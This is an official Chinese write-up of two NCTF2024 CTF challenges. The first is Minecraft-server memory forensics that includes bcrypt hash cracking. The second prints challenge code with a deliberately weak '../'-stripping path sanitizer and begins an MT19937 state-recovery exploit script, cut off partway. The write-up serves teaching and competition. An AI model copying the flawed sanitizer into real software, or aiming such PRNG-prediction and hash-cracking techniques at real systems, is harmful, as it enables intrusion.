        <content type="html"><![CDATA[<h3 id="谁动了我的MC？"><a href="#谁动了我的MC？" class="headerlink" title="谁动了我的MC？"></a>谁动了我的MC？</h3><p>直接用strings看一下内核版本，当然也可以用vol的banners插件</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/fa6335eb-1f6e-4e42-ba0a-091949fbc6bc.png" alt="飞书文档 - 图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">安装对应版本的内核镜像</span><br><span class="line">sudo apt-get install linux-image-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的内核头文件</span><br><span class="line">sudo apt-get install linux-headers-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的内核模块</span><br><span class="line">sudo apt-get install linux-modules-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">安装对应版本的驱动</span><br><span class="line">sudo apt-get install linux-modules-extra-5.4.0-205-generic</span><br><span class="line"></span><br><span class="line">查看已经安装的内核版本  </span><br><span class="line">dpkg -l |grep linux-image</span><br></pre></td></tr></table></figure><p>查看当前 GRUB 菜单项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep menuentry /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>根据输出确定你想要启动的内核菜单项。假设<code>Ubuntu, with Linux 5.4.0-205-generic</code> 的索引是 1&gt;5，其中1表示 <code>Advanced options for Ubuntu</code> 菜单的索引，5表示新内核版本在 <code>Advanced options for Ubuntu</code> 菜单中的索引（从 0 开始）。</p><p>通过修改 GRUB 配置文件，可以设置默认启动的内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/default/grub</span><br></pre></td></tr></table></figure><p>找到GRUB_DEFAULT项将其修改为 <code>GRUB_DEFAULT=&quot;1&gt;5&quot;</code>，更新 GRUB 配置并重启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>查看当前内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>在<code>/boot</code>目录下找到对应内核版本的<code>System.map-5.4.0-205-generic</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install build-essential dwarfdump</span><br><span class="line"></span><br><span class="line">cd volatility2/tools/linux</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">zip ./Ubuntu-20.04.6-live-server.zip ./module.dwarf /boot/System.map-5.4.0-205-generic</span><br></pre></td></tr></table></figure><p>将制作好的profile放到<code>volatility2/volatility/plugins/overlays/linux</code>下，用–info能查看到就是成功了。</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/ea010ca5-0e68-4550-ae9e-9c8059a593c6.png" alt="img"></p><p>linux_recover_filesystem恢复整个文件系统，这需要一点时间，主要是看<code>opt/mcsmanager/daemon/data/InstanceData/</code>底下的文件恢复的差不多（基本不再增加）以后就可以停下了。</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/cee53b00-7da5-442b-9634-2664ce3f2441.png" alt="img"></p><p>第一问要找服务器面板的密码，在<code>opt/mcsmanager/web/data/User</code>这个路径下有一个json文件，里面存储了面板的用户信息，里面有密码的密文</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/69113efa-dfe0-436b-8048-da4c58e2fc96.png" alt="img"></p><p>从开头的<code>$2a$10</code>可以看出来这是bcrypt，用给的字典爆破一下很快就能得到密码明文I0am0alone</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/879641c5-8498-425d-80f7-21d94e131d3f.png" alt="img"></p><p>接下来两问得放一起看</p><p>可以看出服务器用了ftbbackups模组，保留了十个备份的世界方便回档，在<code>opt/mcsmanager/daemon/data/InstanceData/e00336260129441a9b74844d485b2cd6/bakcups</code>这个路径下，挑一个能够打开的用MC进去看一下。版本从其他地方很容易就能看出来是java版1.21</p><p>不难找到这座房子，就在出生点附近，后面有一格岩浆。由于在MC中，岩浆会使附近烧起来，所以我们可以推断出岩浆就是起火源。</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/7dd6b9e3-74a2-4172-baac-192a89e4226d.png" alt="img"></p><p>F3查看坐标（Block）是-405,63,132</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/1e536848-b7b5-4983-bc39-e7208f0037df.png" alt="img"></p><p>接下来就是找出是谁放的这桶岩浆，由于volatility恢复出的日志不全，前面一大半明显是缺失了</p><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/bdaadb7a-d100-49e1-8c84-1279583afc58.png" alt="img"></p><p>这里可以使用古法取证 :D</p><p>我们知道，在MC中，当你第一次拿起岩浆可以获得一个叫做<code>hot stuff</code>（中文：热腾腾的）的成就，我们直接用010在1.mem中搜索一下就能找到对应的用户Nathan，这是预期的解法，也应该是最简单的解法了:)当然也可以去world文件夹中找具体的玩家数据等</p><blockquote><p>也许有的师傅会发现Ethan曾经造出过打火石，但显然根据前面进世界所见那是个迷惑选项 :D</p></blockquote><p><img src="/images/NCTF2024-X1crypsc%E3%80%81%E8%B0%81%E5%8A%A8%E4%BA%86%E6%88%91%E7%9A%84MC%EF%BC%9F-Official-Writeup/9154b4f6-dda9-4bb8-9906-027c6db7cfdb.png" alt="img"></p><p>nctf{I0am0alone_Nathan_-405_63_132}</p><h3 id="X1crypsc"><a href="#X1crypsc" class="headerlink" title="X1crypsc"></a>X1crypsc</h3><blockquote><p>此题为与校队密码手Hibiscus共同出题</p></blockquote><p>题目完整源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">text = <span class="string">&quot;X1crypsc&quot;</span></span><br><span class="line">ascii_art = pyfiglet.figlet_format(text)</span><br><span class="line"><span class="built_in">print</span>(ascii_art)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]I want to play a game.\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]If you win the game, I will give you a gift:)\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]But try to beat the monster first:)\n&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]Good luck!\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]You got a weapon!\n&#x27;</span>)</span><br><span class="line">damage_rng = ()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regenerate_damage</span>():</span><br><span class="line">    <span class="keyword">global</span> damage_rng</span><br><span class="line">    base = getrandbits(<span class="number">16</span>)</span><br><span class="line">    add = getrandbits(<span class="number">16</span>)</span><br><span class="line">    damage_rng = (base ,base + add)</span><br><span class="line">monster_health = getrandbits(<span class="number">64</span>)</span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">---Options---</span></span><br><span class="line"><span class="string">[W]eapon</span></span><br><span class="line"><span class="string">[A]ttack</span></span><br><span class="line"><span class="string">[E]xit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">regenerate_damage()</span><br><span class="line"><span class="built_in">print</span>(menu)</span><br><span class="line">HP = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> monster_health &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Victory!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> HP &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] DEFEAT&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Monster current HP:<span class="subst">&#123;monster_health&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Your current HP: <span class="subst">&#123;HP&#125;</span>&#x27;</span>)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&#x27;[-] Your option:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> opt == <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Current attack value: <span class="subst">&#123;damage_rng[<span class="number">0</span>]&#125;</span> ~ <span class="subst">&#123;damage_rng[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;[+] Do you want to refresh the attack profile of the weapon([y/n])?&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            regenerate_damage()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] New weapon attack value: <span class="subst">&#123;damage_rng[<span class="number">0</span>]&#125;</span> ~ <span class="subst">&#123;damage_rng[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] The monster sensed of an imminent danger and is about to teleport!!\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Now you have to aim at the monster\&#x27;s location to hit it!\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Input format: x y\n&#x27;</span>)</span><br><span class="line">        x,y = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>(<span class="string">f&#x27;[-] Provide the grid you\&#x27;re willing to aim:&#x27;</span>).split())</span><br><span class="line">        <span class="keyword">if</span> [x,y] ==  [randrange(<span class="number">2025</span>),randrange(<span class="number">2025</span>)]:</span><br><span class="line">            dmg = <span class="built_in">min</span>(<span class="built_in">int</span>(randint(*damage_rng) ** (Random().random() * <span class="number">8</span>)),monster_health)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Decent shot! Monster was hevaily damaged! Damage value = <span class="subst">&#123;dmg&#125;</span>&#x27;</span>)</span><br><span class="line">            monster_health -= dmg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Your bet didn&#x27;t pay off, and the monster presented a counterattack on you!&quot;</span>)</span><br><span class="line">            HP -= <span class="number">1</span>     </span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Bye~&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Invalid input&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]Well done! You won the game!\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]And here is your gift: you got a chance to create a time capsule here and we\&#x27;ll keep it for you forever:)\n&#x27;</span>)</span><br><span class="line">keep_dir = <span class="string">&#x27;/app/user_file/&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">File</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        os.makedirs(<span class="string">&#x27;user_file&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="keyword">if</span> filename.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;[!]Invalid filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_path</span>(<span class="params">self, filename</span>):</span><br><span class="line">        hashed = hashlib.sha256(filename.encode()).hexdigest()[:<span class="number">8</span>]</span><br><span class="line">        sanitized = self.sanitize(filename)</span><br><span class="line">        <span class="keyword">return</span> os.path.join(keep_dir, hashed, sanitized)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">user_input</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            filename = <span class="built_in">input</span>(<span class="string">&#x27;[-]Please enter the file name you want to create: &#x27;</span>)</span><br><span class="line">            data = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = <span class="built_in">input</span>(<span class="string">&#x27;[-]Now write something into the file (or type &quot;exit&quot; to finish writing): &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> line.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                data.append(line)</span><br><span class="line">                another_line = <span class="built_in">input</span>(<span class="string">&#x27;[-]Write in another line? [y/n]: &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> another_line.lower() != <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                path = self.get_path(filename)</span><br><span class="line">                os.makedirs(os.path.dirname(path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">                        f.write(line)</span><br><span class="line">                        f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]Your file has been successfully saved at <span class="subst">&#123;path&#125;</span>, we promise we\&#x27;ll never lose it :)&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]Something went wrong, please try again.&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                ask = <span class="built_in">input</span>(<span class="string">&#x27;[-]Create more files? [y/n]: &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> ask.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> ask.lower() == <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[!]Invalid input, please try again.\n&#x27;</span>)</span><br><span class="line">file = File()</span><br><span class="line">file.user_input()</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="一阶段解析"><a href="#一阶段解析" class="headerlink" title="一阶段解析"></a>一阶段解析</h4><p>MT19937的伪随机和线性变换理解。<del>做出本题甚至不需要你有关于逆向MT19937相关的知识</del></p><h5 id="核心逻辑梳理"><a href="#核心逻辑梳理" class="headerlink" title="核心逻辑梳理"></a><strong>核心逻辑梳理</strong></h5><p>打怪的核心逻辑：</p><ul><li>怪兽的血量是<code>getrandbits(64)</code>  </li><li>可以无限地洗炼武器的属性，每次会调用<code>getrandbits(16)</code>生成两个随机数，分别作为武器基础伤害下限、上下限之差  </li><li>怪兽在即将受到攻击时会闪现至<code>(randrange(2025),randrange(2025))</code>处，你需要预判怪兽的最终位置  </li><li>攻击怪兽时会用<strong>全局的</strong><code>randint</code>从武器的基础伤害中随机取值，并乘以一个<strong>Random新实例的</strong>（默认转化为0-1间的<code>float</code>）幂数</li></ul><p>显然我们的目的即为通过不断洗炼武器来收集足够多的随机数，以预测后面的随机数。  </p><h5 id="Random库相关"><a href="#Random库相关" class="headerlink" title="Random库相关"></a><strong>Random库相关</strong></h5><p>Random库的绝大多数函数所依赖的函数就是<code>getrandbits</code>。如<code>randint</code>的调用链就是<code>randint</code> -&gt; <code>_randbelow</code> -&gt; <code>getrandbits</code>。  </p><p><code>getrandbits(n)</code>函数的特性：  </p><ul><li>若 n &#x3D; 32，则会将MT19937对应下标的状态值<code>extract</code>后直接输出；  </li><li>若 n &lt; 32，则会将<code>getrandbits(32)</code>的结果截断后输出（高位优先，如<code>n=16</code>下<code>0x12345678</code>会被截断为<code>0x1234</code>）；  </li><li>若 n &gt; 32，则会多次调用<code>getrandbits(32)</code>，按后一次输出的结果在高位拼凑而成。</li></ul><blockquote><p><code>getrandbits(64)</code>确实是两个 <code>getrandbits(32)</code> 拼接而成，但后者并不是两个 <code>getrandbits(16)</code> 拼接而成，即<code>getrandbits(32)</code>是每次<code>extract</code>的最小单元。  </p></blockquote><h5 id="伪随机逆向之没有MT19937的MT19937"><a href="#伪随机逆向之没有MT19937的MT19937" class="headerlink" title="伪随机逆向之没有MT19937的MT19937"></a><strong>伪随机逆向之没有MT19937的MT19937</strong></h5><p>广义上来说，MT19937的系统的状态构成就是624*32&#x3D;19968个二进制位，或者 $$Z_{2}$$ 下的一个维度为19968的向量。  </p><p>而MT19937的所有变换都是线性的，意即，MT19937的所有方法（<code>__init__</code>、<code>twist</code>、<code>extract</code>）都可以视为一个既有向量（或其一部分）和一个矩阵在 $$Z_{2}$$ 下做乘法的结果。  </p><blockquote><p>相对地，非线性变换则指不能被表示成矩阵乘法的一种变换。  </p></blockquote><blockquote><p> 作为参考，AES中，<em>ShiftRows</em> 和 <em>MixColumns</em> 这两种操作都是线性变换，起到扩散(Diffusion)的作用；而 <em>SubBytes</em> 则是典型的非线性变换，起到混淆(Confusion)的作用。  </p></blockquote><p>认识到线性变换这一特性的作用就在于，我们可以在不获得连续的19968个状态分量（传统的MT19937逆向）的情况下依然能够预测随机数。  </p><p>假设存在 $$Z_{2}$$ 下的一个初始向量 $$v_{19968}$$ ，其中每一个维度都是MT19937的初始状态（624个32位数展开而得），经过“某种”变换（任意次数的状态旋转、提取、截取等等）后，由输出位经过特定方式排列的结果是结果向量 $$v^{‘}_{19968}$$。由于这种变换是线性的，因此存在一个19968*19968的矩阵 M，满足 $$v^{‘} &#x3D; v \cdot M$$。  </p><p>此时只需要找到这个变换矩阵 M，即可通过 $$v^{‘}$$ 反推出 v。  </p><p>而在上述执行的变换确定的情况下，通过打黑盒即可确定 M。具体地，构造一个全零的、19968维的向量 v，依次让第 i 位为1，每次执行和题目相同的变换（重复<code>getrandbits</code>操作）并记录结果，获得的19968个二进制位即为 M 的第 I 行。  </p><p>M 构造完成后再和题目交互，得到向量后直接<code>solve_left</code>就可以得到MT19937的初始状态；将之代入<code>Random</code>的新实例中，和题目以相同的方式运行一遍，即可来到和交互环境中的MT19937相同的状态。随后将本地和远程的PRNG同步，即可开挂把怪打掉。  </p><blockquote><p>这个矩阵 M 是19968*19968的，构造之非常耗时和烧内存，由于该矩阵是确定的，因此建议只构造一次并将之存储起来，需要重新打&#x2F;debug时再加载；可能需要虚拟内存（否则Windows下挂WSL的sage可能会崩）</p></blockquote><h4 id="一阶段exp"><a href="#一阶段exp" class="headerlink" title="一阶段exp"></a>一阶段exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ[<span class="string">&#x27;TERM&#x27;</span>] = <span class="string">&#x27;xterm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;task.py&#x27;</span>])</span><br><span class="line">t0 = time()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">monster_hp = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line"></span><br><span class="line">whatls = []</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(monster_hp)[<span class="number">2</span>:].zfill(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">n1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">n1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;~&#x27;</span>,drop=<span class="literal">True</span>).strip().decode())</span><br><span class="line">n2 = <span class="built_in">int</span>(io.recvline().strip().decode()) - n1</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n1)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line">whatls.extend(<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(n2)[<span class="number">2</span>:].zfill(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">620</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;option:&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    n1 = <span class="built_in">int</span>(io.recvuntil(<span 